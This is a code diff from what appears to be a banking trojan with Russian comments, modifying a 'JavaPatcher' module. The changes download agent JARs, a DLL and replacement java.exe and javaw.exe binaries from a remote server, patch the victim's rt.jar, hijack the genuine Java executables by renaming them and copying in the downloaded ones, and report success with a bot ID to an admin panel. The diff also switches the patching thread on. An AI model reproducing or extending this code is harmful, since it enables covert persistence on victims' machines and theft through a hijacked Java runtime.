@@ -372,7 +372,7 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 	return res;
 }
 
-static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* iniFilePath2, char* jarExeFilePath, char* javaExe )
+static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* iniFilePath2, char* jarExeFilePath, char* javaExe, char* javaExew )
 {
 	FILE_CRC32* filesCrc32 = LoadCorrectCRC32(baseUrl);
 
@@ -458,10 +458,16 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExe, crcName ) )
 		return false;
 
+	crcName = addUrl = "javaw.exe";
+	m_lstrcpy( javaExew, Path );
+	pPathAppendA( javaExew, addUrl );
+	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
+		return false;
+
 	//загрузка в папку ALLUSERSPROFILE
 	GetAllUsersProfile( Path, sizeof(Path) );
 
-	const char* miscFiles[] = { "Agent.jar", /*"AgentPassive.jar",*/ "jni.dll", "client2015.jar", 0 };
+	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
 	{
@@ -489,7 +495,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	return true;
 }
 
- static bool PatchRtJar( const char* userName, const char* baseUrl, char* libPatch, char* javaExe )
+ static bool PatchRtJar( const char* userName, const char* baseUrl, char* libPatch, char* javaExe, char* javaExew )
 {
 	MemPtr<MAX_PATH> tmpRtPath;
 	pGetTempPathA( tmpRtPath.size(), (char*) tmpRtPath );
@@ -503,7 +509,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath;
 
 	bool res = false;
-	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, javaExe ) )
+	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, javaExe, javaExew ) )
 	{
 		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, libPatch ) )
 			res = true;
@@ -841,6 +847,37 @@ void SendLogToAdmin( const char* c, const char* v )
 	STR::Free(adminUrl);
 }
 
+static bool ReplacementExe(const char* java, const char* javao, const char* javaExe)
+{
+	MemPtr<MAX_PATH> srcJava, dstJava;
+	m_lstrcpy( srcJava, javaHome );
+	pPathAppendA( srcJava.str(), "bin" );
+	m_lstrcpy( dstJava, srcJava );
+	pPathAppendA( srcJava.str(), java );
+	pPathAppendA( dstJava.str(), javao );
+	bool ret = true;
+	if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
+	{
+		if( pMoveFileA( srcJava.str(), dstJava.str() ) )
+		{
+			DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
+		}
+		else
+		{
+			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+			ret = false;
+		}
+	}
+	if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
+	{
+		DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
+	}
+	else
+		ret = false;
+	pDeleteFileA(javaExe);
+	return ret;
+}
+
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
 	WJFile();
@@ -851,7 +888,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 		return TRUE;
 
 	MemPtr<513> user;
-	MemPtr<MAX_PATH> path, javaExe;
+	MemPtr<MAX_PATH> path, javaExe, javaExew;
 	char botUid[100];
 	GenerateUid(botUid);
 
@@ -871,7 +908,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	{
 		char *srcFile, *dstFile;
 		*path.str() = 0;
-		if( PatchRtJar( user, javaUrl, path, javaExe ) )
+		if( PatchRtJar( user, javaUrl, path, javaExe, javaExew ) )
 		{
 			UID_To_File(botUid);
 
@@ -918,28 +955,12 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				res = FALSE;		
 			}
 			//Подменяем яву
-			MemPtr<MAX_PATH> srcJava, dstJava;
-			m_lstrcpy( srcJava, javaHome );
-			pPathAppendA( srcJava.str(), "bin" );
-			m_lstrcpy( dstJava, srcJava );
-			pPathAppendA( srcJava.str(), "java.exe" );
-			pPathAppendA( dstJava.str(), "javao.exe" );
-			if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
-			{
-				if( pMoveFileA( srcJava.str(), dstJava.str() ) )
+			if( ReplacementExe( "java.exe", "javao.exe", javaExe.str() ) )
+				if( ReplacementExe( "javaw.exe", "javawo.exe", javaExew.str() ) )
 				{
-					DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
+					//сообщаем админке, что ява патч установлен
+					SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
 				}
-				else
-					DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
-			}
-			if( pCopyFileA( javaExe.str(), srcJava.str(), FALSE ) )
-			{
-				DBG( "JavaPatcher", "copy OK %s -> %s", javaExe.str(), srcJava.str() );
-			}
-			pDeleteFileA(javaExe.str());
-			//сообщаем админке, что ява патч установлен
-			SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
 		};
 
 	}
@@ -962,7 +983,7 @@ DWORD WINAPI Run_Path(LPVOID lpData)
 				GetJavaVersion();
 				if( javaCompatible >= 0 )
 				{
-					//StartThread( JavaPatch, NULL );
+					StartThread( JavaPatch, NULL );
 					//pSleep(5000); - узнать нафига тут задержка
 				}
 				break;
